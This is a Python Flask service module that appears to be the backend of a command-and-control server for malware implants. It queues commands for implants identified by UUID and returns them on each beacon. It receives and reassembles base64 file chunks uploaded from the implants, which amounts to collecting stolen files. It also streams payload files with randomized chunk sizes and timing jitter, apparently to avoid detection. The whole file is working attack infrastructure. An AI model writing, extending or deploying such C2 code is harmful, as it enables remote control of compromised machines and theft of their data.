from flask import Response
import time
import logging
import random
import base64
import magic

from app.database import db
from app.database.models import CommandQueue
from app.database.models import FileChunk


logging.basicConfig(level=logging.DEBUG)


def process_beacon(implant_uuid):
    command_queue = CommandQueue.query.filter_by(implant_uuid=implant_uuid).first()
    if not command_queue:
        command_queue = CommandQueue(implant_uuid=implant_uuid, commands=[])
        db.session.add(command_queue)
        db.session.commit()
        command_response = {"command": ""}

        logging.debug(f"A new CommandQueue for {implant_uuid} was added.")
    elif len(command_queue.commands) > 0:
        commands_list = command_queue.commands
        first_command = commands_list.pop(0)
        db.session.delete(command_queue)
        new_queue = CommandQueue(implant_uuid=implant_uuid, commands=commands_list)
        db.session.add(new_queue)
        db.session.flush()
        db.session.commit()
        command_response = {"command": first_command}

        logging.debug(
            f"Popped command {first_command} for {implant_uuid} and updated the CommandQueue."
        )
    else:
        logging.debug(f"No commands for {implant_uuid}.")
        command_response = {"command": ""}

    return command_response


def add_command_to_queue(implant_uuid, command_text):
    command_queue = CommandQueue.query.filter_by(implant_uuid=implant_uuid).first()
    if not command_queue:
        return False

    logging.info(
        f"Before adding: Current commands for {implant_uuid}: {command_queue.commands}"
    )

    if command_queue.commands is None:
        command_queue.commands = []

    commands_list = command_queue.commands
    commands_list.append(command_text)
    db.session.delete(command_queue)
    new_queue = CommandQueue(implant_uuid=implant_uuid, commands=commands_list)
    db.session.add(new_queue)

    db.session.flush()
    db.session.commit()

    logging.info(
        f"After adding: New commands for {implant_uuid}: {command_queue.commands}"
    )

    return True


def list_all_uuids():
    uuids = db.session.query(CommandQueue.implant_uuid).distinct().all()
    return [uuid[0] for uuid in uuids]


def get_commands_for_uuid(implant_uuid):
    command_queue = CommandQueue.query.filter_by(implant_uuid=implant_uuid).first()
    if not command_queue:
        return None
    return command_queue.commands


def save_file_chunk(implant_uuid, file_id, chunk_index, chunk_data):
    chunk = FileChunk(
        implant_uuid=implant_uuid,
        file_id=file_id,
        chunk_index=chunk_index,
        chunk_data=base64.b64decode(chunk_data),
    )
    db.session.add(chunk)
    db.session.commit()

    logging.info(f"Saved chunk {chunk_index} of file {file_id} from {implant_uuid}.")


def assemble_file(file_id):
    chunks = (
        FileChunk.query.filter_by(file_id=file_id).order_by(FileChunk.chunk_index).all()
    )
    if not chunks:
        return None, None

    file_data = b"".join([chunk.chunk_data for chunk in chunks])
    encoded_file = base64.b64encode(file_data).decode("utf-8")

    file_type = magic.from_buffer(file_data)
    return encoded_file, file_type


def get_file_ids():
    file_chunks = (
        db.session.query(FileChunk.implant_uuid, FileChunk.file_id).distinct().all()
    )

    file_ids_by_implant = dict()
    for implant_uuid, file_id in file_chunks:
        if implant_uuid not in file_ids_by_implant:
            file_ids_by_implant[implant_uuid] = []
        file_ids_by_implant[implant_uuid].append(file_id)

    return file_ids_by_implant


def stream_file(file_path):
    # set the seed to time so that it changes with every run
    random.seed()

    def generate():
        with open(file_path, "rb") as file:
            while True:
                chunk_size = random.randint(
                    256 * 1024, 1024 * 1024
                )  # Random chunk size between 256 KB and 1 MB
                chunk = file.read(chunk_size)
                if not chunk:
                    break

                encoded_chunk = base64.b64encode(chunk).decode("utf-8")
                logging.debug(
                    f"Encoded chunk (length: {len(encoded_chunk)}): {encoded_chunk[:100]}..."
                )

                yield encoded_chunk + "\n"
                time.sleep(
                    random.uniform(0.505, 1.25)
                )  # Sleep between 505ms and 1250ms

    return Response(generate(), mimetype="text/plain")
